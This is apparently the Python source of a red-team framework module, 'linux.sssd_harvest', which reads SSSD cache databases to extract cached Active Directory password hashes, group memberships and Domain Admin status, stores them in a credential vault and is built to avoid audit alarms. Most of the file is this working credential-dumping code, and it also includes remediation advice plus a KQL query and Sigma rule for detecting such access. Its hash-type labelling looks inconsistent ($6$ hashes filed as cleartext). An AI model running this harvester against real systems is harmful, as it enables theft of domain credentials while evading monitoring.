"""
SSSD Cache & Credential Harvester - linux.sssd_harvest
MITRE: T1003.008 (OS Credential Dumping: /etc/passwd and /etc/shadow), T1558 (Steal or Forge Kerberos Tickets)

Extracts cached domain credentials, offline salted SHA-512 crypt hashes ($6$),
and group memberships from SSSD LDB databases (/var/lib/sss/db/cache_*.ldb)
without launching external subprocesses or triggering auditd execve alarms.
"""
from __future__ import annotations

import asyncio
import os
from typing import Any

from ares.core.campaign import Finding, Severity
from ares.core.errors import ModuleValidationError
from ares.core.logger import audit, get_logger
from ares.core.tracing import trace_module
from ares.modules.linux._parsers import TDBParser, parse_sssd_ldb_entry
from ares.modules.params import SssdHarvestParams
from ares.sdk import (
    BaseModule,
    EvidenceRecord,
    ExecutionContext,
    FilesystemPermission,
    LockoutCircuitBreaker,
    ModuleResult,
    OpsecLevel,
    ProcessPermission,
    VaultPermission,
    module_contract,
)

logger = get_logger("ares.modules.linux.sssd_harvest")


@module_contract(
    permissions=[
        FilesystemPermission(read_only=True),
        ProcessPermission(allow_subprocesses=False),
        VaultPermission(read_types=[], write_types=["cleartext", "hash"]),
    ],
    circuit_breaker=LockoutCircuitBreaker(),
    params_model=SssdHarvestParams,
)
class SssdHarvestModule(BaseModule[SssdHarvestParams, ModuleResult]):
    """
    linux.sssd_harvest - Extract cached domain credentials and offline hashes from SSSD LDB.

    OPSEC: SILENT (Zero network packets sent to DC; in-process binary file read)
    MITRE: "T1003.008", "T1558"
    OUTPUTS: ["credentials", "cached_hashes", "domain_users"]
    """

    MODULE_ID = "linux.sssd_harvest"
    MODULE_NAME = "SSSD Cache & Credential Harvester"
    MODULE_CATEGORY = "linux"
    MODULE_DESCRIPTION = (
        "Parses SSSD LDB cache databases to harvest offline password hashes "
        "and cached Domain Admin accounts without spawning sub-shells."
    )
    MODULE_AUTHOR = "ARES Sovereign Team <team@ares-framework.io>"
    OPSEC_LEVEL = OpsecLevel.SILENT
    REQUIRES = []
    OUTPUTS = ["credentials", "cached_hashes", "domain_users"]
    MITRE_TECHNIQUES = ["T1003.008", "T1558"]
    PARAMS_MODEL = SssdHarvestParams

    async def assess_feasibility(self, ctx: Any) -> Any:
        """Evaluates whether SSSD cache paths exist and are accessible."""
        from ares.modules.base import FeasibilityReport

        db_path = "/var/lib/sss/db"
        if hasattr(ctx, "params") and isinstance(ctx.params, dict):
            db_path = ctx.params.get("db_path", db_path)

        exists = os.path.exists(db_path)
        readable = os.access(db_path, os.R_OK) if exists else False

        blockers = []
        if not exists:
            blockers.append(f"SSSD database directory not found: {db_path}")
        elif not readable:
            blockers.append(f"Permission denied reading {db_path} (root access required)")

        score = 1.0 if not blockers else (0.5 if exists else 0.0)
        return FeasibilityReport(
            feasible=len(blockers) == 0,
            score=score,
            risk_level="low",
            blockers=blockers,
            recommended_alternatives=["linux.privesc", "linux.ccache_hunt"],
            opsec_tuning={"subprocesses_spawned": 0, "syscall_profile": "O_RDONLY_ONLY"},
            details={"db_path": db_path, "readable": readable},
        )

    async def validate(self, ctx: Any) -> None:
        """Pre-flight parameter validation."""
        await super().validate(ctx)
        if not isinstance(ctx, ExecutionContext):
            return

        db_path = ctx.params.get("db_path", "/var/lib/sss/db") if isinstance(ctx.params, dict) else "/var/lib/sss/db"
        if not isinstance(db_path, str) or not db_path.strip():
            raise ModuleValidationError(
                "linux.sssd_harvest requires a non-empty 'db_path'.",
                module_id=self.MODULE_ID,
                field="db_path",
            )

    async def execute(self, ctx: Any) -> ModuleResult:
        if getattr(ctx, "dry_run", False):
            return ModuleResult(
                status="dry_run",
                module_id=self.MODULE_ID,
                raw={"message": "Dry-run preview: SSSD cache harvesting simulated successfully."},
            )

        target = getattr(ctx, "target", "") or ctx.params.get("target", "localhost")
        db_path = ctx.params.get("db_path", "/var/lib/sss/db")
        extract_hashes = bool(ctx.params.get("extract_offline_hashes", True))
        target_domain = ctx.params.get("target_domain")

        findings, raw = await self.run(
            target=target,
            db_path=db_path,
            extract_offline_hashes=extract_hashes,
            target_domain=target_domain,
            vault=getattr(ctx, "vault", None),
        )

        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings,
            raw=raw,
            module_id=self.MODULE_ID,
        )

    @trace_module("linux.sssd_harvest")
    async def run(
        self,
        target: str,
        db_path: str = "/var/lib/sss/db",
        extract_offline_hashes: bool = True,
        target_domain: str | None = None,
        vault: Any = None,
        **kwargs: Any,
    ) -> tuple[list[dict[str, Any]], dict[str, Any]]:
        await self.before_request(target, "default")
        logger.info("sssd_harvest_start", target=target, db_path=db_path)
        audit("linux_sssd_harvest", actor="operator", technique="T1003.008", target=target)

        loop = asyncio.get_running_loop()
        extracted_accounts = await loop.run_in_executor(
            None,
            lambda: self._scan_and_parse_sssd_sync(db_path, extract_offline_hashes, target_domain),
        )

        # Store to AresVault if available
        _vault = vault or getattr(getattr(self, "campaign", None), "_vault", None)
        stored_vault_count = 0
        if _vault:
            from ares.credential.vault import Credential, CredentialType, PrivilegeLevel

            campaign_id = getattr(getattr(self, "campaign", None), "id", "")
            for acc in extracted_accounts:
                for h in acc.get("hashes", []):
                    try:
                        cred = Credential(
                            campaign_id=campaign_id,
                            username=acc.get("username", "unknown"),
                            domain=acc.get("domain", target),
                            cred_type=CredentialType.NTLM if not h.startswith("$6$") else CredentialType.CLEARTEXT,
                            privilege=(
                                PrivilegeLevel.DOMAIN_ADMIN
                                if acc.get("is_domain_admin")
                                else PrivilegeLevel.DOMAIN_USER
                            ),
                            source_module=self.MODULE_ID,
                            target_host=target,
                        )
                        _vault.store(cred, h)
                        stored_vault_count += 1
                    except Exception as ex:
                        logger.debug("vault_store_failed", error=str(ex)[:60])

        evidence_chain: list[EvidenceRecord] = []
        for acc in extracted_accounts:
            ev = EvidenceRecord(
                artifact_id=f"sssd-account-{acc.get('username', 'user')}",
                source_target=target,
                collected_by=self.MODULE_ID,
                data={
                    "username": acc.get("username"),
                    "domain": acc.get("domain"),
                    "hash_count": len(acc.get("hashes", [])),
                    "is_domain_admin": acc.get("is_domain_admin"),
                    "groups": acc.get("groups", []),
                },
                tags=["sssd", "credential", "ad"],
            )
            evidence_chain.append(ev)

            # Generate finding
            is_da = acc.get("is_domain_admin", False)
            self.finding(
                title=f"SSSD Cached Credential: {acc.get('username')} ({'Domain Admin' if is_da else 'Domain User'})",
                description=(
                    f"Harvested cached Active Directory credentials for {acc.get('username')} "
                    f"from SSSD database {acc.get('source_db')}. "
                    f"Extracted {len(acc.get('hashes', []))} offline hashes."
                ),
                severity=Severity.CRITICAL if is_da else Severity.HIGH,
                mitre_technique="T1003.008",
                mitre_tactic="Credential Access",
                evidence={
                    "username": acc.get("username"),
                    "domain": acc.get("domain"),
                    "source_db": acc.get("source_db"),
                    "is_domain_admin": is_da,
                    "groups": acc.get("groups", []),
                    "hash_types": [h[:3] for h in acc.get("hashes", [])],
                },
                remediation=(
                    "Configure SSSD with 'cached_credentials = False' for high-privilege administrative accounts. "
                    "Enforce strict filesystem permissions (chmod 0600) on /var/lib/sss/db/ files."
                ),
                host=target,
                confidence=0.98,
            )

        # Closed-Loop Purple Telemetry
        kql_query = (
            "// ARES Closed-Loop Telemetry: Detect SSSD Database Access / Offline Hash Tampering\n"
            "DeviceFileEvents\n"
            "| where ActionType in ('FileCreated', 'FileModified', 'FileRead')\n"
            "| where FolderPath has '/var/lib/sss/db'\n"
            "| where InitiatingProcessFileName !in ('sssd', 'sssd_be', 'sssd_nss', 'sssd_pam')\n"
            "| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath"
        )
        sigma_rule = (
            "title: Suspicious SSSD Database Access by Non-SSSD Binary\n"
            "id: 5a2b1c3d-ares-sssd-harvest\n"
            "status: experimental\n"
            "description: Detects unauthorized processes reading SSSD cache databases to dump cached domain credentials.\n"
            "logsource:\n"
            "  product: linux\n"
            "  service: auditd\n"
            "detection:\n"
            "  selection:\n"
            "    name|contains: '/var/lib/sss/db/'\n"
            "  filter:\n"
            "    exe|startswith: '/usr/sbin/sssd'\n"
            "  condition: selection and not filter\n"
            "level: high\n"
            "tags:\n"
            "  - attack.credential_access\n"
            "  - attack.t1003.008\n"
        )

        await self.noise.jitter.sleep()
        return self._findings[:], {
            "target": target,
            "accounts_count": len(extracted_accounts),
            "stored_in_vault": stored_vault_count,
            "accounts": extracted_accounts,
            "kql": kql_query,
            "sigma": sigma_rule,
            "evidence_integrity": [e.record_hash for e in evidence_chain],
        }

    def _scan_and_parse_sssd_sync(
        self,
        db_path: str,
        extract_hashes: bool,
        target_domain: str | None,
    ) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []
        if not os.path.exists(db_path) or not os.path.isdir(db_path):
            return results

        try:
            entries = os.listdir(db_path)
        except (PermissionError, OSError):
            return results

        for entry in entries:
            if not entry.startswith("cache_") or not entry.endswith(".ldb"):
                continue

            # Extract domain from cache_<domain>.ldb
            domain_part = entry[6:-4]
            if target_domain and target_domain.lower() != domain_part.lower():
                continue

            full_path = os.path.join(db_path, entry)
            if not os.path.isfile(full_path):
                continue

            try:
                with open(full_path, "rb") as f:
                    data = f.read()
            except (PermissionError, OSError):
                continue

            records = TDBParser.parse_records(data)
            for key, val in records:
                # Key format in SSSD is typically name=user,cn=users...
                key_str = key.decode("utf-8", errors="replace")
                if "cn=users" in key_str.lower() or "name=" in key_str.lower():
                    parsed = parse_sssd_ldb_entry(val)
                    username = parsed["attributes"].get("name")
                    if not username and "name=" in key_str:
                        username = key_str.split("name=")[1].split(",")[0]

                    if username:
                        results.append({
                            "username": username,
                            "domain": domain_part,
                            "source_db": full_path,
                            "hashes": parsed["hashes"] if extract_hashes else [],
                            "groups": parsed["groups"],
                            "is_domain_admin": parsed["is_domain_admin"],
                            "attributes": parsed["attributes"],
                        })

        return results
